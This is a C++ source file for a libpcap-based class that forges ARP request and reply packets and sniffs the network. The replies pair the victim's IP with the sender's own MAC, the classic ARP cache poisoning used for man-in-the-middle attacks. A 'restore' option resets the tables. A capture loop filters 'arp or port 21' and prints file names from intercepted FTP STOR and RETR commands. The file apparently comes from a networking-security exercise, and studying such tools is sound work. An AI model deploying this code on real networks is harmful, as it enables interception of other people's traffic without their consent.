#include <Pcap.hpp>

Pcap::Pcap(const char *ip_src, const char *mac_src,
	  const char *ip_target, const char *mac_target,
	  std::string &interface) : _ip_src(ip_src), _mac_src(mac_src),
		_ip_target(ip_target), _mac_target(mac_target),
		_interface(interface) {
	std::cout << "Pcap Created" <<std::endl;
	//this->_ip_select = NULL;
	//this->_mac_select = NULL;
	this->_pcap_list = NULL;
	//this->_device_select = NULL;
	this->_device_capture = NULL;
	this->_fp = NULL;
	this->_network = 0;
	this->_netmask = 0;
	this->_sll_halen = 0;
	this->_sll_addr = NULL;
	memset(this->_buf, 0, sizeof(this->_buf));
}

/*
 * Clear pcap allocation
 */
Pcap::~Pcap() {
	if (this->_pcap_list)
		pcap_freealldevs(this->_pcap_list);
	if (this->_device_capture) {
		pcap_close(this->_device_capture);
		//g_pcap_t = NULL;
	}
	if (this->_fp) {
		pcap_freecode(this->_fp);
		delete this->_fp;
	}
	std::cout << "Destroyed" <<std::endl;
}

const std::string & Pcap::getInterface() const {
	return this->_interface;
}

/*struct pcap_if * Pcap::GetDevice() const {
	return this->_device_select;
}*/

pcap_t	* Pcap::GetDeviceCapture() const {
	return this->_device_capture;
}

struct bpf_program * Pcap::getBpf() const {
	return this->_fp;
}

/*
 * Check the selected pcap_addr structure
 * if mac or ip address found, return the selected structure,
 * otherwise return NULL
 */
/*static pcap_addr *search_address(struct pcap_addr *elem,
		std::string &ip_src, const struct ether_addr *mac_src) {
	if (!elem || !mac_src)
		return NULL;
	struct  sockaddr_in *addr = reinterpret_cast<sockaddr_in *>(elem->addr);
	struct sockaddr_ll *macc = reinterpret_cast<sockaddr_ll *>(elem->addr);
	char *ip = NULL;

	switch (addr->sin_family) {
		case AF_INET:
			ip = inet_ntoa(addr->sin_addr);
			if (ip && ip_src  == std::string(ip)) {
			       return elem;	
			}
			break ;
		case AF_PACKET:
			if (macc->sll_halen == 6) {
				int i = 0;

				for (; i < macc->sll_halen; i++) {
					if (mac_src->ether_addr_octet[i] != macc->sll_addr[i]) {
						return NULL;
					}
				}
				return elem;
			}
	}
	return NULL;
}
*/
/*
 * Search for AF_INET type address
 */
/*static struct sockaddr_in *get_afinet(pcap_addr *addr_find) {
	while (addr_find) {
		if (addr_find->addr->sa_family == AF_INET) {
			return (sockaddr_in *)addr_find->addr;
		}
		addr_find = addr_find->next;
	}
	return NULL;
}
*/
/*
 * Search for AF_PACKET type address
 */
/*static struct sockaddr_ll *get_afpacket(pcap_addr *addr_find) {
	while (addr_find) {
		if (addr_find->addr->sa_family == AF_PACKET) {
			return reinterpret_cast<sockaddr_ll *>(addr_find->addr);
		}
		addr_find = addr_find->next;
	}
	return NULL;
}*/
/*
bool Pcap::SetPcapList(void) {
	if (!this->_ip_src.length() || !this->_mac_src.length())
		return false;
	char errbuf[PCAP_ERRBUF_SIZE] = {0};
	const struct ether_addr *mac_src = ether_aton(this->_mac_src.c_str());
	int res = pcap_findalldevs(&this->_pcap_list, errbuf);

	if (res || !mac_src)
		return false;
	pcap_if_t *list_search = this->_pcap_list;
	pcap_addr *addr_list = NULL;
	pcap_addr *addr_find = NULL;

	//search for device	
	while (list_search) {
		addr_list = list_search->addresses;
		while (addr_list) {
			addr_find = search_address(addr_list, this->_ip_src, mac_src);
			if (addr_find)
				break ;
			addr_list = addr_list->next;
		}
		if (addr_find)
			break ;
		list_search = list_search->next;
	}
	bool find_ip = false;
	bool find_mac = false;

	//set ip and check if both ip and mac are from the right device
	if (addr_find) {
		const struct  sockaddr_in *addr = get_afinet(addr_find);
		const struct sockaddr_ll *macc = get_afpacket(addr_find);

		if (addr) {
			const char *ip = inet_ntoa(addr->sin_addr);

			if (ip && this->_ip_src  == std::string(ip)) {
				this->_ip_select = &this->_ip_src;
				find_ip = true;
			}
		}
		if (macc) {
			if (macc->sll_halen == 6) {
				int i = 0;

				for (; i < macc->sll_halen; i++) {
					if (mac_src->ether_addr_octet[i] != macc->sll_addr[i]) {
						break ;
					}
				}
				if (i == macc->sll_halen) {
					find_mac = true;
					this->_mac_select = &this->_mac_src;
				}
			}
		}
	}
	if (!find_mac || !find_ip)
		return false;
	if (this->_ip_select && this->_mac_select
		&& *this->_ip_select == this->_ip_src
		&& *this->_mac_select == this->_mac_src) {
		std::cout << "return true" << std::endl;
		std::cout <<
		"i_sel: " << *this->_ip_select << "\n"
		<< "m_sel: " << *this->_mac_select << std::endl;
		std::cout<<"select: "<<addr_list<<std::endl;
		std::cout<<"select: "<<list_search<<std::endl;
		this->_device_select = list_search;
		return true;
	}
	return false;
}
*/
void	Pcap::SetDeviceCapture(const std::string &interface) {
	char errbuf[PCAP_ERRBUF_SIZE] = {0};

	//if (!src)
	//	throw std::invalid_argument("Couldn't find a device to start capture.");
	std::cout << "dev:" << interface.c_str() << std::endl;
	this->_device_capture = pcap_create(interface.c_str(), errbuf);
	if (!this->_device_capture)
		throw std::runtime_error(errbuf);
	if (pcap_lookupnet(interface.c_str(), &this->_network, &this->_netmask, errbuf))
		throw std::runtime_error(errbuf);
}

int	Pcap::setTimeout(pcap_t *src, int to_ms) const {
	return pcap_set_timeout(src, to_ms);
}

int	Pcap::setSelfMac() {
	char errbuf[PCAP_ERRBUF_SIZE] = {0};
	int res = pcap_findalldevs(&this->_pcap_list, errbuf);

	if (res) {
		return res;
	}
	struct sockaddr_ll *ethernet = NULL;
	struct sockaddr_in *addr = NULL;
	pcap_if_t *list_search = this->_pcap_list;
	pcap_addr *addr_list = NULL;

	while (list_search) {
		addr_list = list_search->addresses;
		if (list_search->name == this->_interface) {
			while (addr_list) {
				if (addr_list
					&& addr_list->addr
					&& addr_list->addr->sa_family == AF_PACKET) {
					ethernet = reinterpret_cast<sockaddr_ll *>(addr_list->addr);
					printf("hl:%d\n", ethernet->sll_halen);
			//		break ;
				}
				if (addr_list
					&& addr_list->addr
					&& addr_list->addr->sa_family == AF_INET) {
					addr = reinterpret_cast<sockaddr_in *>(addr_list->addr);
					//break ;
				}
				if (addr && ethernet)
					break ;
				addr_list = addr_list->next;
			}
		}
		list_search = list_search->next;
		if (ethernet || addr)
			break ;
	}
	list_search = NULL;
	addr_list = NULL;
	if (ethernet) {
		this->_sll_halen = ethernet->sll_halen;
		this->_sll_addr = ethernet->sll_addr;
		//return 0;
	}
	if (ethernet && addr) {
		printf("network:%u %u\n", this->_network, addr->sin_addr.s_addr);
		this->_network = addr->sin_addr.s_addr;
		if (ethernet && addr)
			return 0;
	}
	return 1;
}


int	Pcap::activateCapture(pcap_t *src) const {
	return pcap_activate(this->_device_capture);
}

int	Pcap::compileFilterArp(pcap_t *src)
{
	if (!src)// || !this->_device_select)
		return 1;
	//struct  sockaddr_in *addr = reinterpret_cast<sockaddr_in *>(this->_device_select);

	//if (!addr)
	//	return 1;
	//in_addr_t ipv4 = addr->sin_addr.s_addr;
	if (!this->_fp)
		this->_fp = new struct bpf_program;
	if (!this->_fp)
		return 1;
	memset(this->_fp, 0, sizeof(struct bpf_program));
	return pcap_compile(src, this->_fp, "arp or port 21", 0, this->_netmask);
}

int	Pcap::setFilter(pcap_t *src, struct bpf_program *fp) const {
	return pcap_setfilter(src, fp);
}
#include <fstream>
//
static void handle_arp(const u_char *bytes, bpf_u_int32 len) {
	std::ofstream old_cout;
	const struct ether_arp *arp= reinterpret_cast<const struct ether_arp *>(bytes + ETH_HLEN);

	old_cout.copyfmt(std::cout);
	std::cout << "arp: " << arp << std::endl;
	if (arp) {
		std::cout << "Sender hardware address: ";
		for (unsigned int i = 0; i < ETH_ALEN; i++) {
			std::cout << std::setw(2) << std::setfill('0') \
				<< std::uppercase << std::hex \
				<< static_cast<int>(arp->arp_sha[i]) << std::dec;
			if (i + 1 != ETH_ALEN)
				std::cout << ":";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl;
		//prevoir macro 4
		std::cout << "Sender IPv4 address: ";
		for (unsigned int i = 0; i < FT_IPV4_LEN; i++) {
			std::cout << static_cast<int>(arp->arp_spa[i]);
			if (i + 1 != 4)
				std::cout << ".";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl;
		std::cout << "Target hardware address: ";
		for (unsigned int i = 0; i < ETH_ALEN; i++) {
			std::cout << std::setw(2) << std::setfill('0') \
				<< std::uppercase << std::hex \
			       	<< static_cast<int>(arp->arp_tha[i]) << std::dec;
			if (i + 1 != ETH_ALEN)
				std::cout << ":";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl;
		//prevoir macro 4
		std::cout << "Target IPv4 address: ";
		for (unsigned int i = 0; i < FT_IPV4_LEN; i++) {
			std::cout << static_cast<int>(arp->arp_tpa[i]);
			if (i + 1 != 4)
				std::cout << ".";
		}
		std::cout.copyfmt(old_cout);
		std::cout << std::endl << std::endl;
	}
}

/*
 * Get tcp part from packet
 * Get file's name
 * Display file's name
 * Request: STOR | RETR
 */
static void handle_ftp(const u_char *bytes, bpf_u_int32 len){
	if (!bytes)
		return ;
	bpf_u_int32 size = ETH_HLEN;
	const struct iphdr *ip
		= reinterpret_cast<const struct iphdr *>(bytes + size);
	size += (ip->ihl * 4);
	const struct tcphdr *tcp
		= reinterpret_cast<const struct tcphdr *>(bytes + size);
	size += (tcp->doff * 4);
	const unsigned char *ftp_bytes
		= reinterpret_cast<const unsigned char *>(bytes + size);
	std::string fill_cmp((const char *)ftp_bytes);

	std::cout <<"ftp: " << fill_cmp << std::endl;
	if (ftp_bytes) {
		len -= size;
		if (!fill_cmp.find("STOR")
			|| !fill_cmp.find("RETR")) {
			fill_cmp.replace(0, 4, "");
			std::cout << "FTP name is:" << fill_cmp \
				<< std::endl;
		}
	}
	fill_cmp.clear();
}

/*
 * from header file
 * struct pcap_pkthdr {
 *	struct timeval ts;	* time stamp
 *	bpf_u_int32 caplen;	* length of portion present
 *	bpf_u_int32 len;	* length of this packet (off wire)
 *};
 * FTP = 0x800
 * ARP = 0x806
 */
static void handler(u_char *user, const struct pcap_pkthdr *h,
	    const u_char *bytes) {
	const struct ether_header *eth = (const struct ether_header *)bytes;
	printf("type: %x %x\n", eth->ether_type, ntohs(eth->ether_type));
	if (eth && ntohs(eth->ether_type) == ETHERTYPE_ARP) { // ARP
		handle_arp(bytes, h->len);
	} else if (eth && ntohs(eth->ether_type) == ETHERTYPE_IP) { // FTP
		handle_ftp(bytes, h->len);
	}
}

int	Pcap::loopPcap(pcap_t *src) {
	char errbuf[PCAP_ERRBUF_SIZE] = {0};
	int res = pcap_loop(src, INFINITE, handler, NULL);
	
	printf("res:%d\n", res);
	return res;
}

int	Pcap::sendPacket() const {
	return pcap_sendpacket(this->_device_capture,
		(const u_char *)this->_buf, sizeof(this->_buf));
}

/*
 * Fill pointer address from std::string
 */
void convAddress(const std::string &src, uint8_t *addr,
	const char c, const unsigned int len, const int base) {
	if (!addr)
		return ;
	size_t pos = 0;
	size_t old_pos = 0;
	int i = 0;

	pos = src.find(c, pos);
	while (pos != std::string::npos && i < len) {
		std::string substr = src.substr(old_pos, pos - old_pos);
		old_pos = ++pos;
		pos = src.find(c, old_pos);
		addr[i] = std::stoi(substr, NULL, base);
		i++;
	}
	std::string substr = src.substr(old_pos, pos - old_pos);
	addr[i] = std::stoi(substr, NULL, base);
}

/*void	Pcap::forgePacketRequest(bool restore) {
	struct ether_header eth;
	struct	ether_arp arp;

	memset(this->_buf, 0, sizeof(this->_buf));
	memset(&eth, 0, sizeof(struct ether_header));
	memset(&arp, 0, sizeof(struct ether_arp));
	//convAddress(this->_mac_target, eth.ether_dhost, ':', ETH_HLEN, 16);
	memset(&eth.ether_dhost, 0xFFFF, sizeof(eth.ether_dhost));
	if (!restore && this->_sll_addr) {
		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
			eth.ether_shost[i] = this->_sll_addr[i];
		}
	} else {
		convAddress(this->_mac_src, eth.ether_shost, ':', ETH_HLEN, 16);
	}
	eth.ether_type = htons(0x0806);
	arp.ea_hdr.ar_hrd = htons(1);
	arp.ea_hdr.ar_pro = htons(0x0800);
	arp.ea_hdr.ar_hln = ETH_ALEN;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
	//convAddress(this->_mac_target, arp.arp_tha, ':', ETH_ALEN, 16);
	if (!restore)
		convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
	else
		convAddress(this->_ip_src, arp.arp_tpa, '.', 4, 10);
	if (!restore && this->_sll_addr) {
		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
			arp.arp_sha[i] = this->_sll_addr[i];
		}
	}
	else {
		convAddress(this->_mac_src, arp.arp_sha, ':', ETH_ALEN, 16);
	}
	if (sizeof(this->_network) == 4)
		memcpy(&arp.arp_spa, &this->_network, sizeof(this->_network));
	//convAddress(this->_ip_src, arp.arp_spa, '.', 4, 10);
	memcpy(this->_buf, &eth, sizeof(struct ether_header));
	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
}
*/

void Pcap::forgePacketRequest(bool restore) {
	struct ether_header eth;
	struct	ether_arp arp;

	memset(this->_buf, 0, sizeof(this->_buf));
	memset(&eth, 0, sizeof(struct ether_header));
	memset(&arp, 0, sizeof(struct ether_arp));
	//broadcast
	memset(&eth.ether_dhost, 255, sizeof(eth.ether_dhost));
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		eth.ether_shost[i] = this->_sll_addr[i];
	}
	eth.ether_type = htons(0x0806);
	arp.ea_hdr.ar_hrd = htons(1);
	arp.ea_hdr.ar_pro = htons(0x0800);
	arp.ea_hdr.ar_hln = ETH_ALEN;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op = htons(ARPOP_REQUEST);
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		arp.arp_sha[i] = this->_sll_addr[i];
	}
	memcpy(&arp.arp_spa, &this->_network, sizeof(this->_network));
	if (restore) {
		convAddress(this->_ip_src, arp.arp_tpa, '.', 4, 10);
	} else {
		convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
	}
	memcpy(this->_buf, &eth, sizeof(struct ether_header));
	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
}

void Pcap::forgePacketReply(bool restore) {
	struct ether_header eth;
	struct	ether_arp arp;

	memset(this->_buf, 0, sizeof(this->_buf));
	memset(&eth, 0, sizeof(struct ether_header));
	memset(&arp, 0, sizeof(struct ether_arp));
	convAddress(this->_mac_target, eth.ether_dhost, ':', ETH_HLEN, 16);
	for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
		eth.ether_shost[i] = this->_sll_addr[i];
	}
	eth.ether_type = htons(0x0806);
	arp.ea_hdr.ar_hrd = htons(1);
	arp.ea_hdr.ar_pro = htons(0x0800);
	arp.ea_hdr.ar_hln = ETH_ALEN;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
	if (restore) {
		convAddress(this->_mac_src, arp.arp_sha, ':', ETH_ALEN, 16);
	} else {
		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
			arp.arp_sha[i] = this->_sll_addr[i];
		}
	}
	convAddress(this->_ip_src, arp.arp_spa, '.', 4, 10);
	convAddress(this->_mac_target, arp.arp_tha, ':', ETH_ALEN, 16);
	convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
	memcpy(this->_buf, &eth, sizeof(struct ether_header));
	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
}

/*
 * Forge Ethernet and ARP packet
 */
/*void	Pcap::forgePacketReply(bool restore) {
	struct ether_header eth;
	struct	ether_arp arp;

	memset(this->_buf, 0, sizeof(this->_buf));
	memset(&eth, 0, sizeof(struct ether_header));
	memset(&arp, 0, sizeof(struct ether_arp));
	convAddress(this->_mac_target, eth.ether_dhost, ':', ETH_HLEN, 16);
	if (!restore && this->_sll_addr) {
		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
			eth.ether_shost[i] = this->_sll_addr[i];
		}
	} else {
		convAddress(this->_mac_src, eth.ether_shost, ':', ETH_HLEN, 16);
	}
	eth.ether_type = htons(0x0806);
	arp.ea_hdr.ar_hrd = htons(1);
	arp.ea_hdr.ar_pro = htons(0x0800);
	arp.ea_hdr.ar_hln = ETH_ALEN;
	arp.ea_hdr.ar_pln = 4;
	arp.ea_hdr.ar_op = htons(ARPOP_REPLY);
	convAddress(this->_mac_target, arp.arp_tha, ':', ETH_ALEN, 16);
	convAddress(this->_ip_target, arp.arp_tpa, '.', 4, 10);
	if (!restore && this->_sll_addr) {
		for (int i = 0; i < ETH_HLEN && i < this->_sll_halen; i++) {
			arp.arp_sha[i] = this->_sll_addr[i];
		}
	}
	else {
		convAddress(this->_mac_src, arp.arp_sha, ':', ETH_ALEN, 16);
	}
	convAddress(this->_ip_src, arp.arp_spa, '.', 4, 10);
	memcpy(this->_buf, &eth, sizeof(struct ether_header));
	memcpy(this->_buf + ETH_HLEN, &arp, sizeof(struct ether_arp));
}*/
